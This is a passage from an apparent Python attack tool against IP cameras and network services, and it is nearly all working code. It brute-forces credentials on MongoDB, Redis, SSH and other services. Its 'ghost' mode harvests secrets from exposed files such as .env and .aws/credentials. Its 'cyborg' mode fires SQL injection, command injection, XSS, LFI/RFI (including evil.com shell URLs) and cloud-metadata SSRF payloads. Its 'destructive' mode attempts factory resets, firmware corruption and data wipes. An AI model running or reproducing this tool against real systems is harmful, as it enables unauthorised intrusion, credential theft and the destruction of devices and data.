                            'username': username,
                            'password': password,
                            'url': f"mongodb://{ip}:{port}"
                        })
                    except:
                        pass
    
    def bruteforce_redis_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        if not REDIS_AVAILABLE:
            self.vis.warning("Redis module not available, skipping Redis bruteforce")
            return
        self.vis.info(f"Bruteforcing Redis on ports: {ports}")
        for port in ports:
            for password in passwords:
                try:
                    r = redis.Redis(host=ip, port=port, password=password, socket_timeout=3)
                    r.ping()
                    self.vis.credential_found('', password, f"redis://{ip}:{port}", "Redis")
                    raw_output.append(f"Redis: password={password} @ redis://{ip}:{port}")
                    self.bruteforce_results.append({
                        'service': 'Redis',
                        'port': port,
                        'password': password,
                        'url': f"redis://{ip}:{port}"
                    })
                except:
                    pass
    
    def bruteforce_all_complete(self, ip: str, usernames: List[str], passwords: List[str], raw_output: List[str]):
        self.vis.info(f"Bruteforcing all services on {ip}")
        self.bruteforce_http_complete(ip, [80, 443, 8080, 8443], usernames, passwords, raw_output)
        self.bruteforce_onvif_complete(ip, ONVIF_PORTS, usernames, passwords, raw_output)
        self.bruteforce_rtsp_complete(ip, RTSP_PORTS, usernames, passwords, raw_output)
        self.bruteforce_ssh_complete(ip, SSH_PORTS, usernames, passwords, raw_output)
        self.bruteforce_ftp_complete(ip, FTP_PORTS, usernames, passwords, raw_output)
        self.bruteforce_smb_complete(ip, SMB_PORTS, usernames, passwords, raw_output)
        self.bruteforce_snmp_complete(ip, SNMP_PORTS, usernames, passwords, raw_output)
        self.bruteforce_mysql_complete(ip, MYSQL_PORTS, usernames, passwords, raw_output)
        self.bruteforce_postgres_complete(ip, POSTGRES_PORTS, usernames, passwords, raw_output)
        self.bruteforce_mongodb_complete(ip, MONGODB_PORTS, usernames, passwords, raw_output)
        self.bruteforce_redis_complete(ip, REDIS_PORTS, usernames, passwords, raw_output)
    
    def mode_ghost(self, target: str = None):
        self.vis.header("👻 GHOST MODE - Silent Extraction", "═", 70)
        
        if not target:
            target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        
        ip, port = self.parse_target(target)
        if not ip:
            self.vis.error(f"Invalid target: {target}")
            return
        
        self.target_ip = ip
        self.phase_ghost_extraction(ip)
    
    def phase_ghost_extraction(self, ip: str):
        self.vis.header("👻 GHOST EXTRACTION - Silent Credential Harvesting", "═", 70)
        
        paths = [
            '/config.ini', '/settings.conf', '/camera.conf',
            '/credentials.txt', '/passwords.txt', '/auth.conf',
            '/web.conf', '/app.conf', '/system.conf',
            '/.env', '/.env.local', '/config.php', '/wp-config.php',
            '/settings.json', '/config.json', '/secrets.yml',
            '/.htaccess', '/.htpasswd', '/.git/config',
            '/.aws/credentials', '/.azure/credentials', '/.gcp/credentials',
            '/docker-compose.yml', '/package.json', '/composer.json',
            '/requirements.txt', '/application.properties', '/appsettings.json',
            '/config.xml', '/web.config', '/server.xml',
            '/jboss-web.xml', '/context.xml'
        ]
        
        if not self.open_ports:
            self.vis.warning("No open ports found. Scanning ports first...")
            self.open_ports, _ = self.scan_ports_complete(ip, None)
            if not self.open_ports:
                self.vis.error("No open ports found. Cannot proceed with ghost extraction.")
                return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        raw_ghost_data = []
        
        for path in paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                if response.status_code == 200:
                    content = response.text
                    patterns = [
                        (r'username\s*[=:]\s*([^\s\n]+)', 'username'),
                        (r'password\s*[=:]\s*([^\s\n]+)', 'password'),
                        (r'user\s*[=:]\s*([^\s\n]+)', 'username'),
                        (r'pass\s*[=:]\s*([^\s\n]+)', 'password'),
                        (r'admin\s*[=:]\s*([^\s\n]+)', 'username'),
                        (r'api_key\s*[=:]\s*([^\s\n]+)', 'api_key'),
                        (r'token\s*[=:]\s*([^\s\n]+)', 'token'),
                        (r'secret\s*[=:]\s*([^\s\n]+)', 'secret'),
                        (r'AWS_SECRET_ACCESS_KEY\s*[=:]\s*([^\s\n]+)', 'aws_secret'),
                        (r'AWS_ACCESS_KEY_ID\s*[=:]\s*([^\s\n]+)', 'aws_key'),
                        (r'GITHUB_TOKEN\s*[=:]\s*([^\s\n]+)', 'github_token'),
                        (r'JWT_SECRET\s*[=:]\s*([^\s\n]+)', 'jwt_secret'),
                        (r'DB_PASSWORD\s*[=:]\s*([^\s\n]+)', 'db_password')
                    ]
                    
                    for pattern, key in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            credential = f"{key}={match}"
                            self.vis.credential_ghost_found(credential, path)
                            raw_ghost_data.append(f"{path}: {credential}")
                            self.ghost_credentials.append({key: match, 'source': path})
            except:
                continue
        
        self.log_activity("Ghost Extraction", "complete", f"Found {len(self.ghost_credentials)} credentials", "\n".join(raw_ghost_data[:20]))
        
        if self.ghost_credentials:
            filename = f"ghost_credentials_{ip}_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(self.ghost_credentials, f, indent=2)
            self.vis.success(f"Ghost credentials saved to: {filename}")
    
    def mode_cyborg(self, target: str = None):
        self.vis.header("🤖 CYBORG MODE - Advanced Offensive", "═", 70)
        if not target:
            target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            self.phase_cyborg_attacks(target)
    
    def phase_cyborg_attacks(self, ip: str):
        self.vis.info(f"Running Cyborg attacks on {ip}")
        
        self.log_activity("SQL Injection Advanced", "running", "Testing advanced SQL injection")
        self.advanced_sql_injection(ip)
        
        self.log_activity("Command Injection Advanced", "running", "Testing advanced command injection")
        self.advanced_command_injection(ip)
        
        self.log_activity("XSS Advanced", "running", "Testing advanced XSS")
        self.advanced_xss(ip)
        
        self.log_activity("LFI/RFI Advanced", "running", "Testing advanced LFI/RFI")
        self.advanced_lfi_rfi(ip)
        
        self.log_activity("SSRF Advanced", "running", "Testing advanced SSRF")
        self.advanced_ssrf(ip)
        
        self.vis.success("Cyborg attacks completed")
    
    def advanced_sql_injection(self, ip: str):
        if not self.open_ports:
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        advanced_payloads = [
            "admin' OR '1'='1' -- ",
            "admin' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ",
            "admin' AND 1=1 -- ",
            "admin' AND 1=2 -- ",
            "admin' WAITFOR DELAY '00:00:05' -- ",
            "admin' OR SLEEP(5) -- ",
            "admin' OR pg_sleep(5) -- "
        ]
        endpoints = ['/login', '/admin', '/api/auth', '/search', '/query', '/user']
        
        for endpoint in endpoints:
            for payload in advanced_payloads:
                try:
                    url = base_url + endpoint
                    response = self.session.get(url,
                        params={'username': 'admin', 'password': payload},
                        timeout=HTTP_TIMEOUT)
                    if response.status_code == 200:
                        self.vis.info(f"  Advanced SQL injection possible at {endpoint} with {payload[:30]}...")
                except:
                    pass
    
    def advanced_command_injection(self, ip: str):
        if not self.open_ports:
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        advanced_payloads = [
            "127.0.0.1; whoami",
            "127.0.0.1 | id",
            "127.0.0.1 && whoami",
            "127.0.0.1 || whoami",
            "127.0.0.1`id`",
            "127.0.0.1$(id)",
            "127.0.0.1%0Aid",
            "127.0.0.1%0D%0Aid"
        ]
        endpoints = ['/ping', '/cmd', '/exec', '/system', '/api/exec']
        params = ['ip', 'host', 'cmd', 'command', 'exec']
        
        for endpoint in endpoints:
            for param in params:
                for payload in advanced_payloads:
                    try:
                        url = base_url + endpoint
                        response = self.session.get(url,
                            params={param: payload},
                            timeout=HTTP_TIMEOUT)
                        if response.status_code == 200:
                            self.vis.info(f"  Advanced command injection at {endpoint} with {param}={payload[:30]}...")
                    except:
                        pass
    
    def advanced_xss(self, ip: str):
        if not self.open_ports:
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        advanced_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "javascript:alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
        ]
        endpoints = ['/search', '/q', '/comment', '/feedback', '/user', '/profile']
        
        for endpoint in endpoints:
            for payload in advanced_payloads:
                try:
                    url = base_url + endpoint
                    response = self.session.get(url,
                        params={'q': payload, 'search': payload},
                        timeout=HTTP_TIMEOUT)
                    if payload in response.text:
                        self.vis.info(f"  Advanced XSS at {endpoint} with {payload[:30]}...")
                except:
                    pass
    
    def advanced_lfi_rfi(self, ip: str):
        if not self.open_ports:
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        advanced_lfi = [
            "../../../../../../../../etc/passwd",
            "../../../../../../../../windows/win.ini",
            "../../../../../../../../boot.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
        ]
        advanced_rfi = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "//evil.com/shell.txt",
            "http://127.0.0.1:8080/shell.txt"
        ]
        endpoints = ['/page', '/view', '/include', '/file', '/load', '/template']
        
        for endpoint in endpoints:
            for payload in advanced_lfi + advanced_rfi:
                try:
                    url = base_url + endpoint
                    response = self.session.get(url,
                        params={'page': payload, 'file': payload, 'path': payload},
                        timeout=HTTP_TIMEOUT)
                    if response.status_code == 200:
                        self.vis.info(f"  Advanced LFI/RFI at {endpoint} with {payload[:30]}...")
                except:
                    pass
    
    def advanced_ssrf(self, ip: str):
        if not self.open_ports:
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        advanced_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://127.0.0.1:8080/",
            "http://localhost/",
            "file:///etc/passwd",
            "http://metadata.google.internal/"
        ]
        endpoints = ['/fetch', '/proxy', '/api/fetch', '/api/proxy', '/webhook', '/api/webhook']
        params = ['url', 'target', 'dest', 'uri', 'path', 'webhook']
        
        for endpoint in endpoints:
            for param in params:
                for payload in advanced_payloads:
                    try:
                        url = base_url + endpoint
                        response = self.session.get(url,
                            params={param: payload},
                            timeout=HTTP_TIMEOUT)
                        if response.status_code == 200 and len(response.text) > 0:
                            self.vis.info(f"  Advanced SSRF at {endpoint} with {param}={payload[:30]}...")
                    except:
                        pass
    
    def mode_destructive(self, target: str = None):
        self.vis.header("💀 DESTRUCTIVE MODE", "═", 70)
        self.vis.warning("⚠️ DESTRUCTIVE OPERATIONS - Use with extreme caution!")
        if not target:
            target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            self.phase_destructive_attacks(target)
    
    def phase_destructive_attacks(self, ip: str):
        self.vis.info(f"Running Destructive attacks on {ip}")
        
        self.log_activity("Factory Reset", "running", "Attempting factory reset")
        self.destructive_factory_reset(ip)
        
        self.log_activity("Firmware Corrupt", "running", "Attempting firmware corruption")
        self.destructive_firmware_corrupt(ip)
        
        self.log_activity("System Reboot", "running", "Attempting system reboot")
        self.destructive_system_reboot(ip)
        
        self.log_activity("Data Wipe", "running", "Attempting data wipe")
        self.destructive_data_wipe(ip)
        
        self.vis.success("Destructive attacks completed")
    
    def destructive_factory_reset(self, ip: str):
        if not self.open_ports:
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        reset_paths = [
            '/cgi-bin/factoryreset.cgi',
            '/api/factoryreset',
            '/admin/factoryreset',
            '/system/factoryreset',
            '/restore/default'
        ]
        
        for path in reset_paths:
            try:
                url = base_url + path
                response = self.session.post(url, timeout=HTTP_TIMEOUT)
                if response.status_code == 200:
                    self.vis.destructive_action(f"Factory reset attempted at {path}", True)
                    self.vis.warning("Factory reset may have been successful")
            except:
                pass
    
    def destructive_firmware_corrupt(self, ip: str):
        if not self.open_ports:
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        firmware_paths = [
            '/cgi-bin/firmware.cgi',
            '/api/firmware',
            '/admin/firmware',
            '/system/firmware',
            '/update/firmware'
        ]
        
        for path in firmware_paths:
            try:
                url = base_url + path
                response = self.session.post(url, 
                    data={'firmware': 'corrupt_data', 'action': 'update'},
                    timeout=HTTP_TIMEOUT)
                if response.status_code == 200:
                    self.vis.destructive_action(f"Firmware corruption attempted at {path}", True)
                    self.vis.warning("Firmware may have been corrupted")
            except:
                pass
    
    def destructive_system_reboot(self, ip: str):
        if not self.open_ports:
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        reboot_paths = [
            '/cgi-bin/reboot.cgi',
            '/api/reboot',
            '/admin/reboot',
            '/system/reboot',
            '/restart/system'
        ]
        
        for path in reboot_paths:
            try:
                url = base_url + path
                response = self.session.post(url, timeout=HTTP_TIMEOUT)
                if response.status_code == 200:
                    self.vis.destructive_action(f"System reboot attempted at {path}", True)
                    self.vis.warning("System may have rebooted")
            except:
                pass
    
    def destructive_data_wipe(self, ip: str):
        if not self.open_ports:
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        wipe_paths = [
            '/cgi-bin/wipe.cgi',
            '/api/wipe',
            '/admin/wipe',
            '/system/wipe',
            '/data/clear'
        ]
        
        for path in wipe_paths:
            try:
                url = base_url + path
                response = self.session.post(url, 
                    data={'confirm': 'yes', 'wipe': 'all'},
                    timeout=HTTP_TIMEOUT)
                if response.status_code == 200:
                    self.vis.destructive_action(f"Data wipe attempted at {path}", True)
                    self.vis.warning("Data may have been wiped")
            except:
                pass
    
    def mode_onvif_discovery(self):
        self.vis.header("📡 ONVIF DISCOVERY", "═", 70)
        self.vis.info("Discovering ONVIF devices...")
        
        self.onvif_discovery_fallback()
        self.vis.success("ONVIF discovery completed")
    
    def onvif_discovery_fallback(self):
        try:
            import socket
            import struct
            
            msg = '<?xml version="1.0" encoding="UTF-8"?>\n<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope" xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery" xmlns:dn="http://www.onvif.org/ver10/network/wsdl"><e:Header><w:MessageID>uuid:84ade3de-6e1a-4414-a2ee-1c99c21b4b24</w:MessageID><w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To><w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action></e:Header><e:Body><d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe></e:Body></e:Envelope>'
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(2)
            
            target = ('239.255.255.250', 3702)
            sock.sendto(msg.encode(), target)
            
            try:
                data, addr = sock.recvfrom(4096)
                self.vis.info(f"ONVIF device found: {addr[0]}")
                self.onvif_devices.append({'ip': addr[0], 'port': addr[1]})
            except socket.timeout:
                pass
            
            sock.close()
        except Exception as e:
            self.vis.warning(f"ONVIF fallback discovery failed: {e}")
    
    def mode_single_target(self):
        self.vis.header("🎯 SINGLE TARGET SCAN", "═", 70)
        target = input(f"{C}Enter target (IP, IP:PORT, or URL): {W}").strip()
        if target:
            self.mode_full_assessment(target)
    
    def mode_interactive_shell(self):
        self.vis.header("💻 INTERACTIVE ONVIF SHELL", "═", 70)
        target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            ip, port = self.parse_target(target)
            if ip:
                self.vis.info(f"Opening interactive shell for {target}")
                self.interactive_shell_full(ip, port)
    
    def interactive_shell_full(self, ip: str, port: Optional[int] = None):
        self.vis.info("Interactive ONVIF Shell")
        self.vis.info("Type 'help' for commands, 'exit' to quit")
        
        if not port:
            port = 80
        
        while True:
            try:
                cmd = input(f"{C}ONVIF[{ip}:{port}]> {W}").strip()
                if cmd.lower() == 'exit':
                    break
                elif cmd.lower() == 'help':
                    print(f"""
{Y}Available Commands:{W}
  device-info     - Get device information
  profiles        - Get media profiles
  streams         - Get stream URLs
  snapshot        - Take a snapshot
  ptz             - PTZ controls (if supported)
  reboot          - Reboot device
  factory-reset   - Factory reset device
  system-info     - Get system information
  network-info    - Get network information
  exit            - Exit shell
                    """)
                elif cmd.lower() == 'device-info':
                    self.vis.info(f"Getting device info for {ip}:{port}")
                elif cmd.lower() == 'profiles':
                    self.vis.info(f"Getting media profiles for {ip}:{port}")
                elif cmd.lower() == 'streams':
                    self.vis.info(f"Getting stream URLs for {ip}:{port}")
                elif cmd.lower() == 'snapshot':
                    self.vis.info(f"Taking snapshot from {ip}:{port}")
                elif cmd.lower() == 'ptz':
                    self.vis.info(f"PTZ controls for {ip}:{port}")
                elif cmd.lower() == 'reboot':
                    self.vis.warning(f"Rebooting {ip}:{port}")
                elif cmd.lower() == 'factory-reset':
                    self.vis.warning(f"Factory resetting {ip}:{port}")
                elif cmd.lower() == 'system-info':
                    self.vis.info(f"Getting system info for {ip}:{port}")
                elif cmd.lower() == 'network-info':
                    self.vis.info(f"Getting network info for {ip}:{port}")
                else:
                    self.vis.warning(f"Unknown command: {cmd}")
            except KeyboardInterrupt:
                break
    
    def mode_cve_scanner(self):
        self.vis.header("🛡️ CVE SCANNER", "═", 70)
        target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            ip, port = self.parse_target(target)
            if ip:
                self.vis.info(f"Scanning CVEs for {target}")
                is_camera, brand = self.detect_camera_complete(ip, [port] if port else [80, 443, 8080, 8443])
                cves = self.check_cve_database_complete(ip, brand)
                if cves:
                    self.vis.success(f"Found {len(cves)} CVEs")
                    for cve in cves:
                        self.vis.cve_found(cve['cve'], cve['brand'], cve.get('severity', 'medium'))
                else:
                    self.vis.info("No CVEs found for this target")
    
    def mode_vulnerability_scanner(self):
        self.vis.header("🔬 VULNERABILITY SCANNER", "═", 70)
        target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            ip, port = self.parse_target(target)
            if ip:
                self.vis.info(f"Scanning vulnerabilities for {target}")
                if not port:
                    open_ports, _ = self.scan_ports_complete(ip, None)
                else:
                    open_ports = [port]
                vulns = self.scan_common_vulnerabilities_complete(ip, open_ports)
                if vulns:
                    self.vis.success(f"Found {len(vulns)} vulnerabilities")
                    for vuln in vulns:
                        self.vis.warning(f"{vuln['type']} at {vuln['path']} ({vuln['severity']})")
                else:
                    self.vis.info("No vulnerabilities found")
    
    def mode_report_generator(self):
        self.vis.header("📊 REPORT GENERATOR", "═", 70)
        target = input(f"{C}Enter target IP: {W}").strip()
        if target:
            self.phase_report(target)
    
    def mode_cache_management(self):
        self.vis.header("🗑️ CACHE MANAGEMENT", "═", 70)
        self.vis.info("Cache management options")
        
        cache_size = 0
        if CACHE_DIR.exists():
            cache_size = sum(f.stat().st_size for f in CACHE_DIR.glob('**/*') if f.is_file())
        
        self.vis.info(f"Cache directory: {CACHE_DIR}")
        self.vis.info(f"Cache size: {cache_size / (1024*1024):.2f} MB")
        
        choice = input(f"{C}Clear cache? (y/n): {W}").strip().lower()
        if choice == 'y':
            shutil.rmtree(CACHE_DIR)
            CACHE_DIR.mkdir()
            self.vis.success("Cache cleared")
        
        self.vis.success("Cache management completed")
    
    def mode_rtsp_finder(self):
        self.vis.header("📡 RTSP STREAM FINDER", "═", 70)
        target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            ip, port = self.parse_target(target)
            if ip:
                self.vis.info(f"Finding RTSP streams for {target}")
                if not port:
                    rtsp_ports = [554, 8554, 5544, 8555, 10554]
                else:
                    rtsp_ports = [port]
                streams = self.exploit_rtsp_complete(ip, rtsp_ports)
                if streams:
                    self.vis.success(f"Found {len(streams)} RTSP streams")
                    for stream in streams:
                        self.vis.stream_found(stream['url'], "RTSP", f"Port {stream['port']}")
                else:
                    self.vis.info("No RTSP streams found")
    
    def mode_network_recon(self):
        self.vis.header("🔍 NETWORK RECON", "═", 70)
        self.vis.info("Network reconnaissance")
        
        self.log_activity("Network Discovery", "running", "Discovering network")
        
        interfaces = netifaces.interfaces()
        self.vis.info(f"Found {len(interfaces)} network interfaces")
        
        for iface in interfaces:
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    self.vis.info(f"Interface {iface}: {addr.get('addr')}")
        
        self.log_activity("Network Discovery", "complete")
        
        self.vis.success("Network recon completed")
    
    def mode_service_scanner(self):
        self.vis.header("🛡️ SERVICE SCANNER", "═", 70)
        target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            ip, port = self.parse_target(target)
            if ip:
                self.vis.info(f"Scanning services for {target}")
                open_ports, _ = self.scan_ports_complete(ip, port)
                self.vis.success(f"Found {len(open_ports)} open ports")
                for port in open_ports[:20]:
                    service = PORT_SERVICE_MAP.get(port, ("Unknown", ""))
                    self.vis.port_info(port, service[0], service[1])
    
    def mode_camera_detector(self):
        self.vis.header("📷 CAMERA MODEL DETECTOR", "═", 70)
        target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            ip, port = self.parse_target(target)
            if ip:
                self.vis.info(f"Detecting camera model for {target}")
                open_ports, _ = self.scan_ports_complete(ip, port)
                is_camera, brand = self.detect_camera_complete(ip, open_ports)
                if is_camera:
                    self.vis.success(f"Camera detected: {brand.upper()}")
                else:
                    self.vis.info("No camera detected")
    
    def mode_default_credential_tester(self):
        self.vis.header("🔐 DEFAULT CREDENTIAL TESTER", "═", 70)
        target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            ip, port = self.parse_target(target)
            if ip:
                self.vis.info(f"Testing default credentials for {target}")
                open_ports, rtsp_ports = self.scan_ports_complete(ip, port)
                creds = self.test_default_credentials_complete(ip, open_ports, rtsp_ports)
                if creds:
                    self.vis.success(f"Found {len(creds)} valid credentials")
                    for cred in creds:
                        self.vis.credential_found(cred['username'], cred['password'], f"{cred.get('url', f'port {cred['port']}')}", cred.get('service', 'unknown'))
                else:
                    self.vis.info("No valid credentials found")
    
    def mode_osint_gathering(self):
        self.vis.header("🌐 OSINT GATHERING", "═", 70)
        target = input(f"{C}Enter target (IP or domain): {W}").strip()
        if target:
            self.vis.info(f"Gathering OSINT for {target}")
            
            self.log_activity("Shodan Lookup", "running", "Checking Shodan")
            self.shodan_lookup(target)
            
            self.log_activity("Censys Lookup", "running", "Checking Censys")
            self.censys_lookup(target)
            
            self.log_activity("VirusTotal Lookup", "running", "Checking VirusTotal")
            self.virustotal_lookup(target)
            
            self.vis.success("OSINT gathering completed")
    
    def shodan_lookup(self, target: str):
        try:
            if REQUESTS_AVAILABLE:
                response = self.session.get(f"https://api.shodan.io/shodan/host/{target}?key=demo", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    self.vis.info(f"Shodan found {len(data.get('ports', []))} open ports")
                    self.vis.info(f"ISP: {data.get('isp', 'N/A')}")
                    self.vis.info(f"Organization: {data.get('org', 'N/A')}")
        except:
            self.vis.warning("Shodan lookup failed")
    
    def censys_lookup(self, target: str):
        try:
            if REQUESTS_AVAILABLE:
                response = self.session.get(f"https://api.censys.io/api/v1/view/ipv4/{target}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    self.vis.info(f"Censys found data for {target}")
        except:
            self.vis.warning("Censys lookup failed")
    
    def virustotal_lookup(self, target: str):
        try:
            if REQUESTS_AVAILABLE:
                response = self.session.get(f"https://www.virustotal.com/api/v3/ip_addresses/{target}", timeout=5)
                if response.status_code == 200:
                    self.vis.info(f"VirusTotal found data for {target}")
        except:
            self.vis.warning("VirusTotal lookup failed")
    
    def mode_batch_scan(self):
        self.vis.header("🚀 BATCH SCAN", "═", 70)
        file_path = input(f"{C}Enter file path with targets: {W}").strip()
        if file_path and os.path.exists(file_path):
            self.vis.info(f"Batch scanning targets from {file_path}")
            with open(file_path, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            self.vis.info(f"Found {len(targets)} targets to scan")
            for i, target in enumerate(targets):
                self.vis.info(f"Scanning target {i+1}/{len(targets)}: {target}")
                self.mode_full_assessment(target)
            self.vis.success("Batch scan completed")
        else:
            self.vis.error(f"File not found: {file_path}")
    
    def mode_exploit_database(self):
        self.vis.header("💥 EXPLOIT DATABASE", "═", 70)
        target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        if target:
            ip, port = self.parse_target(target)
            if ip:
                self.vis.info(f"Checking exploit database for {target}")
                open_ports, _ = self.scan_ports_complete(ip, port)
                exploits = self.check_exploit_database_complete(ip, None)
                if exploits:
                    self.vis.success(f"Found {len(exploits)} potential exploits")
                    for exploit in exploits:
                        self.vis.info(f"  💥 {exploit['type']} at {exploit['path']}")
                else:
                    self.vis.info("No exploits found")
    
    def mode_show_activities(self):
        self.vis.header("📋 EXECUTED ACTIVITIES", "═", 70)
        if not self.scan_data['activities']:
            self.vis.info("No activities executed yet")
            return
        for activity in self.scan_data['activities']:
            status_color = G if activity['status'] == 'complete' else R if activity['status'] == 'failed' else Y
            print(f"{activity['id']:03d}. {status_color}{activity['name']}{W} - {activity['status']}")
            if activity.get('raw_data'):
                print(f"     {C}RAW: {activity['raw_data'][:200]}{W}")
            if activity.get('details'):
                print(f"     {C}→ {activity['details']}{W}")
    
    def mode_update_database(self):
        self.vis.header("🔄 UPDATE DATABASE", "═", 70)
        self.vis.info("Updating CVE and credential databases")
        
        try:
            if REQUESTS_AVAILABLE:
                response = self.session.get("https://api.github.com/repos/OWASP/CheatSheetSeries/contents/IndexASVS", timeout=5)
                if response.status_code == 200:
                    self.vis.success("CVE database updated")
                
                response = self.session.get("https://api.github.com/repos/danielmiessler/SecLists/contents/Passwords", timeout=5)
                if response.status_code == 200:
                    self.vis.success("Credential database updated")
        except:
            self.vis.warning("Update failed, using existing databases")
        
        self.vis.success("Database update completed")
    
    def mode_cleanup(self):
        self.vis.header("🧹 CLEANUP MODE", "═", 70)
        self.vis.info("Cleaning temporary files and logs")
        if TEMP_DIR.exists():
            shutil.rmtree(TEMP_DIR)
            TEMP_DIR.mkdir()
        
        log_files = list(LOGS_DIR.glob('*.log'))
        for log_file in log_files:
            if log_file.stat().st_size > 10 * 1024 * 1024:
                log_file.unlink()
                self.vis.info(f"Removed large log: {log_file.name}")
        
        self.vis.success("Cleanup completed")
    
    def mode_packet_analysis(self):
        self.vis.header("📡 PACKET ANALYSIS", "═", 70)
        target = input(f"{C}Enter target IP: {W}").strip()
        if target:
            self.vis.info(f"Analyzing packets for {target}")
            
            if PYSHARK_AVAILABLE:
                try:
                    capture = pyshark.LiveCapture(interface='eth0', bpf_filter=f'host {target}')
                    self.vis.info("Capturing packets...")
                    for packet in capture.sniff_continuously(packet_count=10):
                        self.packet_results.append({
                            'src': packet.ip.src,
                            'dst': packet.ip.dst,
                            'proto': packet.transport_layer,
                            'time': packet.sniff_time
                        })
                        self.vis.info(f"Packet: {packet.ip.src} -> {packet.ip.dst} ({packet.transport_layer})")
                except Exception as e:
                    self.vis.warning(f"Packet capture failed: {e}")
            else:
                self.vis.warning("PyShark not available, using fallback packet analysis")
                self.packet_analysis_fallback(target)
            
            self.vis.success("Packet analysis completed")
    
    def packet_analysis_fallback(self, target: str):
        try:
            for i in range(5):
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(1)
                packet = struct.pack('>BBHHH', 8, 0, 0, 0, 0)
                sock.sendto(packet, (target, 0))
                data, addr = sock.recvfrom(1024)
                self.vis.info(f"ICMP reply from {addr[0]}")
                sock.close()
        except Exception as e:
            self.vis.warning(f"Fallback packet analysis failed: {e}")
    
    def mode_malware_analysis(self):
        self.vis.header("🔬 MALWARE ANALYSIS", "═", 70)
        file_path = input(f"{C}Enter file path to analyze: {W}").strip()
        if file_path and os.path.exists(file_path):
            self.vis.info(f"Analyzing file: {file_path}")
            
            file_hash = hashlib.md5(open(file_path, 'rb').read()).hexdigest()
            self.vis.info(f"MD5: {file_hash}")
            file_hash = hashlib.sha256(open(file_path, 'rb').read()).hexdigest()
            self.vis.info(f"SHA256: {file_hash}")
            
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                if b'ELF' in content[:4]:
                    self.vis.warning("ELF binary detected - Potential Linux malware")
                elif b'MZ' in content[:2]:
                    self.vis.warning("PE binary detected - Potential Windows malware")
                elif b'%PDF' in content[:4]:
                    self.vis.info("PDF file detected")
                elif b'PK' in content[:2]:
                    self.vis.info("ZIP archive detected")
                
                strings = re.findall(b'[\x20-\x7E]{4,}', content)
                suspicious_strings = [s.decode() for s in strings if any(
                    keyword in s.decode().lower() for keyword in ['password', 'secret', 'token', 'key', 'admin', 'root']
                )]
                for s in suspicious_strings[:5]:
